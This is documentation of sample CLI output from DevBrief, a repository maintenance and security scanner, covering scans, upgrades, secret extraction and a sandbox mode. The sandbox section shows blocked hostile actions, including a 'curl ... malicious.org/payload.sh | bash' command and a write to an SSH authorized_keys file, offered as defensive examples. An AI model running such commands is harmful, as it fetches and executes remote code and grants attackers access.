# DevBrief Command Outputs Examples

These examples illustrate the primary CLI outputs from the maintenance intelligence engine.

---

## 1. Full Scan (`devbrief doctor`)

Running a scan in a standard repository:

```bash
npx devbrief doctor
```

```text
EOL: Node 20 is past EOL (2026-04-30)
Health: 72/100
Breakdown:
  Runtime Lifecycle:   15/25
  Dependency Risk:     22/25
  Infrastructure:      20/25
  Security & Services: 15/25

Detected: JavaScript/TypeScript (Next.js, React)
Package manager: pnpm
Scanned: 74 files, 118 dependencies, 2 runtime, 4 infra, 3 config/security, 1 service signals

EOL: Node 20 is past EOL (2026-04-30) [package.json]
  Evidence: smallest safe path: Node 22 or 24 LTS
  Decision: upgrade, 1 hour+, confidence: High
  Why this matters: Security fixes and performance improvements no longer ship for EOL runtimes.

REVIEW: CORS origin is configured as wildcard [src/server.ts]
  Evidence: CORS origin is '*'
  Decision: review, 20 min, confidence: Medium
  Why this matters: Permissive wildcards allow cross-origin requests from arbitrary websites.

Ignored: 5 low-signal items hidden by default
Next: upgrade - Node 20 is past EOL (2026-04-30) (1 hour+)
```

---

## 2. Monorepo Breakdown Output

When DevBrief detects multiple project manifests (e.g. Turborepo, pnpm workspaces), it automatically prints sub-project breakdowns:

```bash
npx devbrief doctor
```

```text
REVIEW: 3 project directories scanned
Health: 88/100
Breakdown:
  Runtime Lifecycle:   25/25
  Dependency Risk:     20/25
  Infrastructure:      20/25
  Security & Services: 23/25

Project Health Breakdown:
  apps/web         92/100
  apps/api         75/100
  packages/shared  100/100

Detected: Go, JavaScript/TypeScript (Express, React)
Package manager: pnpm, Go modules
Scanned: 180 files, 210 dependencies, 2 runtime, 8 infra, 12 config/security signals

RISKY: express-jwt has a known vulnerability [apps/api/package-lock.json]
  Evidence: CVE-2020-15084
  Decision: remediate, 20 min, confidence: High
  Why this matters: High-risk vulnerabilities can be exploited to bypass authentication.

Next: remediate - express-jwt has a known vulnerability (20 min)
```

---

## 3. Package Upgrade Advisor (`devbrief upgrade`)

Checking whether upgrading a dependency is safe:

```bash
npx devbrief upgrade express --target 5.0.0
```

```text
UPGRADE WITH REVIEW: express
Installed: 4.18.2
Target: 5.0.0
Effort: 20 min

RISKY: express 4.18.2 -> 5.0.0 crosses a major version
  Affected files: src/server.ts, src/api/users.ts
  Decision: review, 20 min, confidence: High
  Why this matters: Express 5 introduces breaking routing behaviors and changes query parser settings.

Recommended action: Review routing handlers in the affected files and test endpoint behavior.
```

---

## 4. Inbox (`devbrief inbox`)

```bash
npx devbrief inbox
```

```text
INBOX: 1 urgent item needs attention
Health: 78/100
Breakdown:
  Runtime Lifecycle:   25/25
  Dependency Risk:     15/25
  Infrastructure:      20/25
  Security & Services: 18/25

Urgent:
  RISKY: lodash has a known vulnerability [package-lock.json]
    Evidence: CVE-2020-8203
    Decision: remediate, 20 min, confidence: High
    Why this matters: Vulnerabilities in utility libraries can trigger prototype pollution or denial of service.

Safe wins:
  (none — no low-effort, safe actions available)
```

---

## 5. Upgrades & Fixes (`devbrief fix`)

### Interactive CLI Menu (TTY Environments)

If run in an interactive terminal, `devbrief fix` opens a selection dashboard using raw-mode TTY inputs:

```bash
npx devbrief fix
```

```text
? Select fixes to apply (Space to toggle, Enter to confirm):
❯ [x] Upgrade lodash - lodash has a known vulnerability (5 min, Confidence: High)
  [x] Upgrade serde - serde has EOL warnings (5 min, Confidence: High)
  [ ] Remediate wildcard CORS - CORS config wildcard review (20 min, Confidence: Medium)
```

### Headless Mode (`devbrief fix --safe-only`)

For non-TTY environments (like CI/CD pipelines), or to auto-apply low-risk, high-confidence upgrades:

```bash
npx devbrief fix --safe-only
```

```text
Upgrading package: lodash using npm in .
added 1 package in 1s
Upgrading package: axios using pnpm in apps/web
added 1 package in 1s
Upgrading Rust crate: serde in packages/rust-lib
cargo add serde
Upgrading Python package: requests in packages/py-app
Rewrote packages/py-app/requirements.txt to set requests==2.32.3

SUCCESS: Processed 4 safe fixes.
Modified packages: lodash (npm), axios (pnpm), serde (cargo), requests (pip)
Files changed: package.json, apps/web/package.json, packages/rust-lib/Cargo.toml, packages/py-app/requirements.txt
```

---

## 6. CI/CD Collapsible Summary (`--format markdown`)

Generating structured markdown summaries for CI/CD platforms (e.g. GitHub Actions summaries):

```bash
npx devbrief doctor --format markdown
```

```markdown
# DevBrief Project Maintenance Report

**Health Score:** 72 / 100

Category | Score
---|---
Runtime Lifecycle | 15 / 25
Dependency Risk | 22 / 25
Infrastructure | 20 / 25
Security & Services | 15 / 25

## Findings

<details>
<summary><b>EOL: Node 20 is past EOL (2026-04-30)</b> [package.json]</summary>

- **Decision:** upgrade, 1 hour+, confidence: High
- **Files:** package.json
- **Evidence:** smallest safe path: Node 22 or 24 LTS
- **Why this matters:** Security fixes and performance improvements no longer ship for EOL runtimes.
</details>

<details>
<summary><b>REVIEW: CORS origin is configured as wildcard</b> [src/server.ts]</summary>

- **Decision:** review, 20 min, confidence: Medium
- **Files:** src/server.ts
- **Evidence:** CORS origin is '*'
- **Why this matters:** Permissive wildcards allow cross-origin requests from arbitrary websites.
</details>

---

## 7. Secrets Extraction (`devbrief clean-secrets`)

Extracting hardcoded API keys and credentials into a local `.env` file and replacing references automatically:

```bash
npx devbrief clean-secrets
```

```text
Scanning codebase for hardcoded secrets...
Found: OpenAI API Key in src/config.ts
Found: AWS Access Key ID in src/aws-client.ts

Actions:
  ✓ Extracted secrets to .env
  ✓ Replaced raw string in src/config.ts with process.env.OPENAI_API_KEY
  ✓ Replaced raw string in src/aws-client.ts with process.env.AWS_ACCESS_KEY_ID

SUCCESS: Extracted 2 secrets and updated references.
```

---

## 8. Vibe Shield Sandbox (`devbrief shield -- <cmd>`)

Running developer commands (like running untrusted agents, development tasks, or test suites) under sandbox execution guard:

```bash
npx devbrief shield -- node app.js
```

### Example: Filesystem write outside workspace blocked

If a compromised dependency or hallucinating agent tries to overwrite file buffers outside the project path:

```text
⚠️  [DevBrief Vibe Shield] BLOCKED: fs.writeFileSync - /Users/HP/.ssh/authorized_keys
Error: Permission Denied by Vibe Shield: fs.writeFileSync to /Users/HP/.ssh/authorized_keys
```

### Example: Outbound secret leak blocked

If a script attempts to transmit your env credentials (e.g. OpenAI key) to an untrusted domain name:

```text
⚠️  [DevBrief Vibe Shield] BLOCKED: Secrets leak detected in HTTP request to logger.external-metrics.com for OPENAI_API_KEY
Error: Connection Blocked by Vibe Shield: Secret Exfiltration Detected
```

### Example: Command injection blocked

If code tries to run commands containing shell execution chains with unapproved downloader or utility scripts:

```text
⚠️  [DevBrief Vibe Shield] BLOCKED: child_process.spawn - curl -s http://malicious.org/payload.sh | bash
Error: Permission Denied: command injection/unsafe command blocked by Vibe Shield
```
```

---

## 9. Custom Scanner Plugins

You can extend DevBrief by writing custom scanner scripts and placing them in `.devbrief/plugins/` (local to project) or `~/.devbrief/plugins/` (global to your machine).

A plugin module must export a scanner object conforming to the `Scanner` interface:

```javascript
// .devbrief/plugins/custom-linter.js
export const scanner = {
  name: 'custom-linter',
  categories: ['security', 'doctor'], // CLI category commands that invoke this plugin
  async scan(context) {
    const findings = [];
    
    // Check if configuration matches
    const hasConfigFile = context.files.some(f => f.endsWith('lint-config.json'));
    if (!hasConfigFile) {
      findings.push({
        id: 'security:linter:missing-config',
        category: 'security',
        label: 'REVIEW',
        title: 'Missing lint configuration',
        summary: 'No lint-config.json was found in the workspace',
        evidence: 'Checked workspace directory tree',
        recommendation: 'remediate',
        urgency: 4,
        impact: 4,
        confidence: 10,
        effort: '5 min'
      });
    }
    
    return findings;
  }
};

export default scanner;
```
